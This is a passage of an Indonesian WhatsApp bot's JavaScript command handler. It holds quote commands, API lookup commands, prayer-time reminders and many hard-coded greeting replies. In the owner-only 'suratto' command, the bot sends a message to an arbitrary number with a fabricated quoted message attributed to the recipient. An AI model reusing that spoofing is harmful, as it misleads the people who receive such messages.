aku ketika itu..','Hanya Allah yang mengerti bagaimana sulitnya menahan sabar tanpa harus bercerita panjang lebar.','Letakkan hpmu lalu ambil air wudhu, shalatlah kamu, Allah menunggu curhatan darimu.','Maafin aku Ya Allah Gara gara aku mencintai dia tapi tidak pasti, sampai aku lupa mencintai mu juga.','Akan ada saatnya setelah salam dari sholatku, tanganmu yang pertama kali kusentuh.','Mungkin maksud Tuhan mempertemukan kamu dengannya adalah, sekedar mengingatkan bahwa tidak semua yang kamu inginkan bisa kamu dapatkan.','Percayalah Seorang wanita yang mencintai Allah. Allah akan berikan lelaki terbaik untuk menjaganya.','Berterimakasihlah kepada tuhan, Yang memberimu hidup dan kehidupan.','Mungkin kamu hanya harus sedikit peka untuk menyadari petunjuk dari Tuhan atas doa-doamu.']
					const isl = islami[Math.floor(Math.random() * islami.length)]
					islam = await getBuffer(`https://i.ibb.co/dPnjvD3/IMG-20210127-WA0018.jpg`)
					client.sendMessage(from, islam, image, { quoted: mek, caption: '*Quotes Islami*\n\n'+ isl })
					await limitAdd(sender)
					break	
		case 'quotesnasehat':
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply(ind.baned())
					const nasehat =['Jangan pernah mengabaikan apapun yang terjadi, suatu saat akan sadar dan menyesal, ingat tuhan akan selalu memberikan penyesalan terakhir ...','Ingat iya.. Perilaku mu bisa mengubah perasaan seseorang.','Setia itu bukan yang selalu ada, namun saat tak bersama dia tahu hatinya milik siapa.','Kamu perlu belajar satu hal : "Menghargai seriusnya seseorang."','Jangan cari yang sempurna, Sempurnakan saja yang ada.','Ketika seseorang menghina kamu, itu adalah sebuah pujian bahwa selama ini mereka menghabiskan banyak waktu untuk memikirkan kamu, bahkan ketika kamu tidak memikirkan mereka.','Yang terbaik tidak akan hilang. Jika dia hilang maka dia bukanlah yang terbaik.','Percayalah. Suatu hari nanti pasti akan ada seseorang yang bangga memilikimu.','Tidak ada karya yang pernah dibuat oleh seorang seniman yang malas.','Jika seseorang memberimu perhatian jangan pernah mengabaikannya karena suatu saat perhatian sekecil itu kamu rindukan saat kamu kesepian.','Bersyukurlah.. Untuk segala apapun yang engkau miliki saat ini, sebab nikmat itu akan bertambah ketika kamu dapat mensyukuri apa yang telah diberi saat ini. #Buat diri ini jangan banyak mengeluh yah.','Ada perbedaan antara menyerah dan tau kapan kamu merasa cukup dalam berusaha.','Jangan sampai kesenanganmu menyusahkan orang lain. Jangan pula kesusahanmu menyenangkan orang lain.','Semakin banyak kamu memberi, semakin banyak pula yang akan kembali padamu.','Jangan pernah bandingkan akhir kesuksesan orang lain dengan pertengahan prosesmu.','Lakukan apa yang kamu bisa, dengan apa kamu miliki, dimanapun kamu berada.','Hidup memang bukan balapan, tetapi kamu memang perlu untuk terus bergerak maju.','NIKMATI HIDUPMU, LUPAKAN UMURMU.','Sebaik-baiknya permintaan maaf adalah membaiknya tingkah laku.','Belajarlah memahami bahwa tidak semua keinginan bisa terpenuhi, barangkali itu adalah obat yang terbaik untuk mencegah kecewa dan sakit hati.','Kamu akan menemukan yang terbaik, ketika kamu sudah berhenti membanding-bandingkan.','Jangan menilai orang dari masa lalunya karena kita semua sudah tidak hidup disana. Semua orang bisa berubah, biarkan mereka membuktikannya.','Jika dia tidak merasakan kehadiranmu, buat dia merasakan kepergianmu.','Orang pintar mampu memecahkan masalah. Orang bijak mampu menghindarinya.','Bersikap tidak lagi peduli lebih baik dari pada balas dendam.','Tegas akan diri sendiri, buang pikiran negatif dan lakukan yang baik. Kegelisahan hanya milik mereka yang putus asa.','Jangan pikirkan kegagalan kemarin, hari ini sudah lain, sukses pasti diraih selama semangat masih menyengat.','Memaafkanmu bukan berarti memberimu kesempatan sekali lagi.','Berubah menjadi lebih baik adalah pilihan. Tapi, merasa paling baik adalah kesalahan.','Jangan pernah bandingkan dirimu dengan orang lain, tapi bandingkanlah dengan dirimu yang lalu, apakah hari ini sudah lebih baik?','Ketahuilah orang yang paling sering memberi nasihat kepadamu, itulah orang yang paling mencintai kamu.','Jangan pernah berhenti belajar, karena hidup tidak pernah berhenti mengajarkan.','Salah satu tanda dirimu tidak berakhlak adalah main HP ketika ada orang yang berbicara.','Raihlah kesuksesan yang tidak seseorangpun berfikir kamu bisa meraihnya. Buktikan pada mereka kalau kamu bisa!','Kesalahan adalah bukti nyata kalau kamu pernah mencoba. Jangan takut salah. Takutlah untuk melakukan kesalahan-kesalahan yang sama dua kalinya.','Cepat atau lambat bukan masalah. Selama kamu tetap bergerak maju, tidak ada akhirnya kamu akan tetap sampai tidak ada tujuan.','Jika kamu tidak bisa membahagiakan orang lain, Setidaknya janganlah kamu tambah dukanya.','Teruslah berusaha sampai temanmu berkata kepadamu "Sombong iya sekarang."','Ketika kamu melakukan sebuah kesalahan, Akuilah dan jangan ragu untuk meminta maaf. Tidak pernah ada satupun orang dalam sejarah yang mati tersedak karena menelan gengsinya sendiri.','Syukuri yang menyayangimu, Maafkan yang menyakitimu.','Tunjukkan keburukanmu, lalu lihat siapa yang bertahan.','Kamu boleh lelah, tetapi tidak boleh menyerah untuk selamanya.','Jangan pernah lupa bilang "Terima Kasih." Jangan pernah gengsi bilang "Maaf." Jangan pernah jadi terlalu sombong untuk bilang "Tolong."','Masa lalu tidak bisa berubah, diubah, dilupakan, ataupun di hapus. Masa lalu hanya bisa di terima','Kita ini.. sangat pintar menghakimi, Namun bodoh dalam memperbaiki diri.','Tidak peduli seberapa baiknya kamu, Kebaikan tidak akan berarti apa-apa jika kamu memberikan kepada orang yang salah.','Orang sabar selalu menang, Orang tamak selalu rugi, Orang marah selalu kalah, Orang baik selalu diuji.','Carilah tempat dimana kamu bisa dihargai, Bukan dibutuhkan. Karena banyak orang mencarimu hanya saat butuh saja, Hingga lupa bagaimana cara menghargaimu.','Melupakan orang yang melukaimu adalah hadiahmu untuk mereka. Memaafkan orang yang melukaimu adalah hadiahmu untuk dirimu sendiri.','Maafkan orang yang menyakitimu... Bukan karena mereka pantas di maafkan, Tapi karena kamu harus berbahagia.','Tetaplah kuat, Tetaplah positif, Buatlah mereka bertanya-tanya bagaimana kamu masih tetap bisa tersenyum.','Jangan meninggalkan yang pasti demi yang mungkin. Sebab semua kemungkinan, belum tentu menjadi kepastian.','Seseorang pernah berkata padaku, Merelakan bukan berarti menyerah, Tapi tidak bisa dipaksakan.','Ikuti alurnya, Nikmati prosesnya, Tuhan tau kapan kita harus bahagia.','Usia hanyalah angka, Hanya mereka yang terus berusaha yang berhasil.','Jangan pernah meremehkan siapapun! Karena sukses adalah balas dendam Terbaik.','Pria sejati.. Harus menyelesaikan apa yang sudah dimulai.','Jika kau ingin terbang, Kau harus melepaskan hal-hal yang membuatmu berat.','Siapapun yang meremehkan mu hari ini, Suatu saat harus kamu lewati.','Jangan Mencintai terlalu mudah, Jangan Percaya terlalu cepat, Jangan Berhenti terlalu dini, Jangan Berharap terlalu tinggi, Jangan Bicara terlalu banyak.','Jadilah orang baik tapi jangan biarkan orang lain mengambil keuntungan dari mu. Ketahuilah kapan kamu harus bilang tidak.','Sahabat sejati adalah mereka tau semua kelemahan mu, Tapi tidak menggunakan nya untuk menjatuhkan mu.','Ada tiga hal yang harus dimiliki dalam hidup yaitu : Perubahan, Pilihan dan Prinsip.','Orang bodoh mengira dirinya bijak. orang bijak tau dirinya bodoh.','Jatuh cintalah seperlunya.. Kemudian patah hatilah secukupnya. Karena semua ada porsinya, Karena semua ada masanya.','Kita tidak pernah tau jalan hidup seseorang.. Maka ada baiknya jika kita tidak menghakiminya atas keputusan dalam hidupnya.','Jangan pernah menyesal mengenal seseorang dalam hidupmu, Orang baik akan memberi mu Kebahagiaan, Orang jahat akan memberi mu Pengalaman, Bahkan seburuk-buruk manusia akan memberi mu Pelajaran.','Jangan menilai kedewasaan dari usia seseorang, Karena itu bukan jaminan.']
					const nsh = nasehat[Math.floor(Math.random() * nasehat.length)]
					nase = await getBuffer(`https://i.ibb.co/bspYPtC/IMG-20210125-WA0018.jpg`)
					client.sendMessage(from, nase, image, { quoted: mek, caption: '*Quotes Nasehat*\n\n'+ nsh })
					await limitAdd(sender)
					break	
		case 'quotescinta':
					if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply(ind.baned())
					const cinta =['Disaat bosan dan jarang ketemu Aku harap kamu tidak mencari kenyamanan dengan orang lain.','Saya tidak mencari yang sempurna, tapi saya mencari yang menganggap saya dan, tidak malu memiliki saya.','Maaf aku mencintaimu hanya bermodalkan setia bukan dengan harta.','Berjanjilah tidak akan pergi, walaupun ada seseorang yang lebih sempurna dariku.','Boleh aku minta satu hal? Tolong jangan jatuh cinta pada orang lain selain aku.','Ketika ibuku mengenalmu, berarti aku sungguh serius berhubungan denganmu.','Aku tidak ingin kehilanganmu hari ini, esok, ataupun selamanya.','Aku memilihmu karena aku nyaman, dan itu tidak aku dapatkan dari orang lain.','Cinta terbaik adalah saat kamu mencintai seseorang yang membuat akhlaqmu makin indah, dan hatimu makin bijak.','Laki laki hebat dia mempersiapkan lamaran bukan mengajak pacaran.','Sebaik-baiknya cinta adalah cinta yang di halalkan.','Duduklah disampingku, akan diceritakan betapa tulusnya aku mencintaimu.','Berkomitmen denganmu adalah adaptasi yang tidak cukup sehari. Setiap harinya petualangan, Kadang menyebalkan seringkali menyenangkan beberapa kali ingin mundur tapi sepertinya hidup takan baik baik saja tanpamu.','Bersabarlah Cinta sejati tau kemana dia akan pulang.','Bahagialah kamu yang mempunyai dia yang tidak hanya pintar merebut hati, namun juga pintar menjaga hati.','Ketika cowok sudah masuk ke logikanya cewek. Ketika cewek sudah masuk ke perasaannya cowok. Masing-masing tidak akan bisa ke mana-mana.','Dia yang selalu memuja kelebihanmu pada akhirnya akan kalah dengan dia yang masih tetap di sisimu setelah tau kekuranganmu.','Kamu bisa berjalan dengan siapa saja, Tapi tolong, Tolong jaga hati ini, yang sudah mencintai mu.','Kalau kangen tidak usah bilang-bilang ya.. Takutnya entar aku luluh terus lupa alasan membenci kamu. Serius..','Kadang kita harus merelakan yang kita cintai, Mengikhlaskan yang kita ingini. Bukan karena Allah tidak sayang, Tapi itulah tanda sayangnya dia, agar bisa belajar bahwa kita hanya dititipi bukan memiliki.','Jika masih kalah dari jarak & sinyal berarti cintamu tak cukup handal.','Aku cemburu karena aku takut seseorang bisa membahagiakanmu lebih daripada aku.','Jatuh cinta sih boleh pake perasaan, Tapi ngerawatnya pake penghasilan.','Seseorang yang memang ditakdirkan untuk mu akan selalu ada di sisimu\nTAK PERLU KAU KEJAR\nTAK PERLU KAU MOHON\nTAK PERLU KAU PAKSA','Semoga yang saat ini bersamaku, Tidak menyimpan rasa pada orang lain.','Kamu tidak bisa memaksa dia untuk mencintai mu, Tapi kamu bisa memaksa dirimu untuk berhenti mencintainya.','Cinta itu tak akan pernah mati. Tapi bisa berpindah ke lain hati,Kepada dia yang lebih menghargai.','Tolong, Jangan hanya diam ketika aku sedang memperjuangkanmu..','Beberapa orang ditakdirkan untuk saling jatuh cinta, Tapi tidak ditakdirkan untuk bersama.','Mari kita saling melengkapi.Aku akan menjadi kelebihan di setiap kekuranganmu.Dan kau akan menjadi kelebihan di setiap kekurangan ku.','Mencintaimu adalah bahagia dan sedih. Bahagia karena memiliki mu dalam kalbu, Sedih karena kita sering berpisah.','Mimpiku sangat sederhana, Yaitu mencintai mu dan bisa berada dalam satu ikatan halal bersama mu.']
					const cin = cinta[Math.floor(Math.random() * cinta.length)]
					buffer = await getBuffer(`https://i.ibb.co/vL5x6F7/IMG-20210126-WA0018.jpg`)
					client.sendMessage(from, buffer, image, { quoted: mek, caption: '*Quotes Cinta*\n\n'+ cin })
					await limitAdd(sender)
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
					break
				case 'pinterest':
				if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply(ind.baned())
					client.updatePresence(from, Presence.composing)
					data = await fetchJson(`https://api.zeks.xyz/api/pinimg?apikey=${ZeksApi}&q=${body.slice(10)}`, { method: 'get' })
					yana = data.data
					reply(ind.wait())
					n = JSON.parse(JSON.stringify(yana));
					nimek = n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					client.sendMessage(from, pok, image, { quoted: mek, caption: `*PINTEREST*` })
					console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
					break
                   case 'ppcouple':
				client.updatePresence(from, Presence.composing) 
				if (!isRegistered) return reply(ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply(ind.baned())
				data = fs.readFileSync('./lib/ppcouple.js');
				jsonData = JSON.parse(data);
				randIndex = Math.floor(Math.random() * jsonData.length);
				randKey = jsonData[randIndex];
				Laki = await getBuffer(randKey.result.laki)
				client.sendMessage(from, Laki, image,  { caption: '*_Nih kak_*', quoted: mek })
				Cewe = await getBuffer(randKey.result.cewek)
				client.sendMessage(from, Cewe, image, { caption: '*_Nih kak_*', quoted: mek })
				await limitAdd(sender)
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan')) 
			break
			case 'kusonime':
				if (!isRegistered) return reply( ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply(ind.baned())
				data = await fetchJson(`https://xteam.xyz/anime/kusonime?q=${body.slice(10)}&APIKEY=${Xteam}`)
				textskus = `${data.info}\n\nLink Download :\n${data.link_dl}\n\nSinopsis : ${data.sinopsis}`
				buffer = await getBuffer(data.thumb)
				client.sendMessage(from, buffer, image, {quoted: mek, caption: textskus})
				await limitAdd(sender)
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
				break
				case 'infonomor':
				if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply(ind.baned())
				if (args.length < 1) return reply(`Masukan Nomor\nContoh : ${prefix}infonomor 0812345678`)
				data = await fetchJson(`https://docs-jojo.herokuapp.com/api/infonomor?no=${body.slice(11)}`)
				if (data.error) return reply(data.error)
				if (data.result) return reply(data.result)
				hasil = `╠➥ internasional : ${data.international}\n╠➥ nomor : ${data.nomor}\n╠➥ operator : ${data.op}`
				reply(hasil)
				await limitAdd(sender)
				console.log(color('[COMMAND]', 'blue'), color(command, 'yellow'), color(time, 'white'), color('Name:', 'yellow'), color(pushname, 'cyan'), color('Number:', 'yellow'), color(sender.split('@')[0], 'cyan'))
			break 
					case 'brainly':
					if (!isRegistered) return reply(ind.noregis())
		if (isBanned) return reply(ind.baned())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
                    brien = body.slice(9)
					brainly(`${brien}`).then(res => {
					teks = '❉───────────❉\n'
					for (let Y of res.data) {
						teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉───────────❉\n`
					}
					client.sendMessage(from, teks, text, {quoted: mek, detectLinks: false})
                        console.log(res)
                    })
					await limitAdd(sender)
					break 
					case 'wiki':
				if (!isRegistered) return reply(ind.noregis())
				if (!isGroup) return  reply('Command ini tidak bisa digunakan di pribadi!\n\n*Harap gunakan di group!*')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply(ind.baned())
				if (args.length < 1) return reply('masukan kata kunci kak')
				tels = body.slice(6)					
				anu = await fetchJson(`https://alfians-api.herokuapp.com/api/wiki?q=${tels}`, {method: 'get'})
				reply(anu.result)
				await limitAdd(sender)
			break
                    case 'kbbi':
                if (!isRegistered) return reply(ind.noregis())
		if (isBanned) return reply(ind.baned())
                if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (args.length < 1) return reply('Apa yang mau dicari um?')
					anu = await fetchJson(`https://mnazria.herokuapp.com/api/kbbi?search=${body.slice(6)}`, {method: 'get'})
					reply('Menurut Kbbi:\n\n'+anu.result)
					await limitAdd(sender)
					break
					case 'suratto': 
                if (!isRegistered) return reply(ind.noregis())
                if (!isOwner) return reply(ind.ownerb())
				if (args.length < 1) return reply(`Ketik ${prefix}suratto No tujuan|Isi surat\nMax 5 Kata`)
				const textp = body.slice(9)
				const noorg2 = textp.split("|")[0]
				const katakita2 = textp.split("|")[1]
				const kataorg2 = `•Surat resmi untuk kamu•`
				try {
				pping = await client.getProfilePicture(`${sender.split('@')[0]}@c.us`)
				} catch {
				pping = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				const frnzer = `
╔═ ◤ ${a}SURAT FITUR${a} ◢
║╔▸ *From* : ${pushname}
║╠ *Number* : @${sender.split("@")[0]}
║╠ *For* : You
║╚▸
║╔▸   ﹝ ${a}ISI SURAT${a} ﹞  
║╚▸ ${katakita2}
╚═ ◤ *${namabot}* ◢ `
				client.sendMessage(`${noorg2}@s.whatsapp.net`,pping, image , {caption: frnzer, quoted: { key: {fromMe:false, participant:`${noorg2}@s.whatsapp.net`},message: { conversation: `${kataorg2}`, contextInfo: {"mentionedJid": [sender]}}}});	
				reply('Surat Sukses Dikirim Ciee Ciee')
				break
					
					 
            
           
                        
                                                  
				default:
				if (hour_now >= '02:00' && hour_now <= '04:00') {
          console.log(color('[PESAN DARI DARMA]', 'cyan'), color('Waktunya sahur kak, Main botnya buat nanti lagi, Sebelum makan jangan lupa baca Doa ya kak', 'yellow'), color('(😊)', 'white'))
          }
        if (hour_now >= '04:00' && hour_now <= '05:00') {
          console.log(color('[PESAN DARI DARMA]', 'cyan'), color('Bentar lagi jam 5 nih kak, Jangan lupa sholat subuh ya kak', 'yellow'), color('(😊)', 'white'))
          }
          if (hour_now >= '05:00' && hour_now <= '06:00') {
          console.log(color('[PESAN DARI DARMA]', 'cyan'), color('Udah sholat Subuh belum kak', 'yellow'), color('(🙄)', 'white'))
          }
        if (hour_now >= '06:00' && hour_now <= '11:00') {
          console.log(color('[PESAN DARI DARMA]', 'cyan'), color('Pagi kak, Jangan lupa mandi', 'yellow'), color('(😅)', 'white'))
          }
          if (hour_now >= '11:00' && hour_now <= '12:00') {
          console.log(color('[PESAN DARI DARMA]', 'cyan'), color('Siang kak, Dah mandi blm kak?', 'yellow'), color('(🙄)', 'white'))
          }
          if (hour_now >= '12:00' && hour_now <= '14:00') {
           console.log(color('[PESAN DARI DARMA]', 'cyan'), color('Dah jam 12 kak, Jangan lupa sholat Dzuhur ya kak', 'yellow'), color('(😊)', 'white'))
           }
        if (hour_now >= '14:00' && hour_now <= '15:00') {
          console.log(color('[PESAN DARI DARMA]', 'cyan'), color('Sore kak, Jangan lupa mandi', 'yellow'), color('(😅)', 'white'))
          }
        if (hour_now >= '15:00' && hour_now <= '16:00') {
          console.log(color('[PESAN DARI DARMA]', 'cyan'), color('Dah jam 3 kak, Jangan lupa sholat Ashar ya kak', 'yellow'), color('(😊)', 'white'))
          }
        if (hour_now >= '17:00' && hour_now <= '18:00') {
          console.log(color('[PESAN DARI DARMA]', 'cyan'), color('Bentar lagi buka kak, Sabar ya kak', 'yellow'), color('(😆)', 'white'))
          }
        if (hour_now >= '18:00' && hour_now <= '19:00') {
        	console.log(color('[PESAN DARI DARMA]', 'cyan'), color('Alhamdulillah, Dah buka kak, Puasanya dibatalin dulu kak, Sebelum makan jangan lupa baca doa kak, Setelah makan langsung sholat Maghrib ya kak', 'yellow'), color('(😊)', 'white'))
        }
        if (hour_now >= '19:00' && hour_now <= '20:00') {
           console.log(color('[PESAN DARI DARMA]', 'cyan'), color('Bentar lagi jam 8 kak, Yok kak main botnya buat nanti lagi, Sekarang siap-siap dulu buat Sholat Tarawih', 'yellow'), color('(😊)', 'white'))
           }
        if (hour_now >= '20:00' && hour_now <= '00:00') {
           console.log(color('[PESAN DARI DARMA]', 'cyan'), color('Selamat malam kak, Jangan begadang ya kak, Tar sakit loh', 'yellow'), color('(😄)', 'white'))
        }
          if (hour_now >= '00:00' && hour_now <= '02:00') {
           console.log(color('[PESAN DARI DARMA]', 'cyan'), color('ReneBot ngantuk kak, tidur dulu ya kak', 'yellow'), color('(😴)', 'white'))
        }
                  if (budy.includes(`sound1`)) {
                  const ara = fs.readFileSync('./30detik/sound1.mp3');
                  client.sendMessage(from, ara, MessageType.sound, {quoted: mek})
                  }
            if (budy.match('ssalamu')){
	if (isBanned) return
        /*let assalaam = fs.readFileSync('./mp3/WhatsApp-Audio-2021-03-02-at-20.46.15.opus')
        client.sendMessage(from, assalaam, MessageType.audio, { quoted: mek, ptt: true })*/
	client.sendMessage(from, `Waalaikumusalam kak ${pushname}😘`, MessageType.text, {quoted: mek})
	}
        if (budy.includes(`Test`)) {
                  reply(`Aktip kak ${pushname}😅\nKetik *${prefix}menu* untuk memakai bot`)
                  }
        if (budy == 'Prefix'){
	client.sendMessage(from, `Prefix : ${prefix}`, MessageType.text, {quoted: mek});
	}
	if (budy == 'Bot'){
	if (isBanned) return
	client.sendMessage(from, `Reneasy disini kak ${pushname} 😘`, MessageType.text, {quoted: mek});
	}
	if (budy == 'P'){
	if (isBanned) return
	client.sendMessage(from, 'Pa Pe Pa Pe. Salam dong', MessageType.text, {quoted: mek});
	}
	if (budy == 'p'){
	if (isBanned) return
	client.sendMessage(from, 'Salam Woy!', MessageType.text, {quoted: mek});
	}
	if (budy == 'about'){
	if (isBanned) return 
	client.sendMessage(from, 'Peraturan:\nDilarang spam, share virtex. (BLOCKIR)\nDilarang call. (BLOCKIR)\nDilarang chat pribadi, jika bukan premium. (BLOCKIR)\n\nInfo:\nBot join ke grup donasi 10k perbulan\nMinta limit maximal 5\nLimit 1k = 5k\nLimit 3k = 10k\nLimit 5k = 15k\n\nPremium:\nBebas fitur\n7day = 10k + limit 1k & uang bot 100k\n30day = 25k + limit 1k & uang bot 100k\n1 grup premium 100 anggota = 150rb + limit 1k & uang bot 100k\n\nBuy Nomor Bot:\nFungsi bebas\nBisa premium ke semua pengguna dan menjadi owner atau admin!\nHarga: 7 day 30k\nHarga: 30 day 45k\n\nGroup kami:\nhttps://chat.whatsapp.com/HlIbSDEOseg9iUBvEBrtq0\nInfo lebih lanjut ketik *about*', MessageType.text, {quoted: mek});
	}
	if (budy == 'halo'){
	if (isBanned) return
	client.sendMessage(from, 'Hallo kak ☺️', MessageType.text, {quoted: mek});
	}
	if (budy == 'Halo'){
	if (isBanned) return
	client.sendMessage(from, 'Hallo kak ☺', MessageType.text, {quoted: mek});
	}
	if (budy == 'helo'){
	if (isBanned) return
	client.sendMessage(from, 'Hello kak ☺', MessageType.text, {quoted: mek});
	}
	if (budy == 'Helo'){
	if (isBanned) return
	client.sendMessage(from, 'Hello kak ☺', MessageType.text, {quoted: mek});
	}
	if (budy == 'hello'){
	if (isBanned) return
	client.sendMessage(from, 'Hello kak ☺', MessageType.text, {quoted: mek});
	}
	if (budy == 'Hello'){
	if (isBanned) return
	client.sendMessage(from, 'Hello kak ☺', MessageType.text, {quoted: mek});
	}
	if (budy == 'hallo'){
	if (isBanned) return
	client.sendMessage(from, 'Hallo kak ☺', MessageType.text, {quoted: mek});
	}
	if (budy == 'Hallo'){
	if (isBanned) return
	client.sendMessage(from, 'Hallo kak ☺', MessageType.text, {quoted: mek});
	}
	if (budy == 'Hai'){
	if (isBanned) return
	client.sendMessage(from, 'Hai kak ☺', MessageType.text, {quoted: mek});
	}
	if (budy == 'hai'){
	if (isBanned) return
	client.sendMessage(from, 'Hai kak ☺', MessageType.text, {quoted: mek});
	}
	if (budy == 'Haii'){
	if (isBanned) return
	client.sendMessage(from, 'Hai kak ☺', MessageType.text, {quoted: mek});
	}
	if (budy == 'haii'){
	if (isBanned) return
	client.sendMessage(from, 'Hai kak ☺', MessageType.text, {quoted: mek});
	}
	if (budy == 'Hai kak'){
	if (isBanned) return
	client.sendMessage(from, 'Hai kak ☺', MessageType.text, {quoted: mek});
	}
	if (budy == 'hai kak'){
	if (isBanned) return
	client.sendMessage(from, 'Hai kak ☺', MessageType.text, {quoted: mek});
	}
	if (budy == 'Haii kak'){
	if (isBanned) return
	client.sendMessage(from, 'Hai kak ☺', MessageType.text, {quoted: mek});
	}
	if (budy == 'haii kak'){
	if (isBanned) return
	client.sendMessage(from, 'Hai kak ☺', MessageType.text, {quoted: mek});
	}
	if (budy == 'Hai bro'){
	if (isBanned) return
	client.sendMessage(from, 'Hai bro 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'hai bro'){
	if (isBanned) return
	client.sendMessage(from, 'Hai bro 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'Hai gan'){
	if (isBanned) return
	client.sendMessage(from, 'Hai gan 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'hai gan'){
	if (isBanned) return
	client.sendMessage(from, 'Hai gan 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'Haii bro'){
	if (isBanned) return
	client.sendMessage(from, 'Hai bro 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'haii bro'){
	if (isBanned) return
	client.sendMessage(from, 'Hai bro 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'Haii gan'){
	if (isBanned) return
	client.sendMessage(from, 'Hai gan 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'haii gan'){
	if (isBanned) return
	client.sendMessage(from, 'Hai gan 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'Hai sayang'){
	if (isBanned) return
	client.sendMessage(from, 'Hai sayang 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'hai sayang'){
	if (isBanned) return
	client.sendMessage(from, 'Hai sayang 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'Haii sayang'){
	if (isBanned) return
	client.sendMessage(from, 'Hai sayang 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'haii sayang'){
	if (isBanned) return
	client.sendMessage(from, 'Hai sayang 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'Hi'){
	if (isBanned) return
	client.sendMessage(from, 'Hai.. kak ☺', MessageType.text, {quoted: mek});
	}
	if (budy == 'hi'){
	if (isBanned) return
	client.sendMessage(from, 'Hai.. kak ☺', MessageType.text, {quoted: mek});
	}
	if (budy == 'Hi bro'){
	if (isBanned) return
	client.sendMessage(from, 'Hai.. bro 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'hi bro'){
	if (isBanned) return
	client.sendMessage(from, 'Hai.. bro 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'Hi gan'){
	if (isBanned) return
	client.sendMessage(from, 'Hai.. gan 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'hi gan'){
	if (isBanned) return
	client.sendMessage(from, 'Hai.. gan 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'Hii bro'){
	if (isBanned) return
	client.sendMessage(from, 'Hai.. bro 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'hii bro'){
	if (isBanned) return
	client.sendMessage(from, 'Hai.. bro 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'Hii gan'){
	if (isBanned) return
	client.sendMessage(from, 'Hai.. gan 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'hii gan'){
	if (isBanned) return
	client.sendMessage(from, 'Hai.. gan 😎', MessageType.text, {quoted: mek});
	}
	if (budy == 'Hi sayang'){
	if (isBanned) return
	client.sendMessage(from, 'Hai.. juga sayang 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'hi sayang'){
	if (isBanned) return
	client.sendMessage(from, 'Hai.. juga sayang 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'Hii sayang'){
	if (isBanned) return
	client.sendMessage(from, 'Hai.. juga sayang 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'hii sayang'){
	if (isBanned) return
	client.sendMessage(from, 'Hai.. juga sayang 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'Hai sayang'){
	if (isBanned) return
	client.sendMessage(from, 'Hai.. juga sayang 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'hai sayang'){
	if (isBanned) return
	client.sendMessage(from, 'Hai.. juga sayang 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'Haii sayang'){
	if (isBanned) return
	client.sendMessage(from, 'Hai.. juga sayang 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'haii sayang'){
	if (isBanned) return
	client.sendMessage(from, 'Hai.. juga sayang 🥰', MessageType.text, {quoted: mek});
	}
	if (budy == 'hii'){
	if (isBanned) return
	client.sendMessage(from, 'Hai.. kak ☺', MessageType.text, {quoted: mek});
	}
	if (budy == 'Hii'){
	if (isBanned) return
	client.sendMessage(from, 'Hai.. kak ☺', MessageType.text, {quoted: mek});
	}
	if (budy == 'Eh bot'){
	if (isBanned) return
	client.sendMessage(from, 'Iya.. apa kak? 🤔', MessageType.text, {quoted: mek});
	}
	if (budy == 'eh bot'){
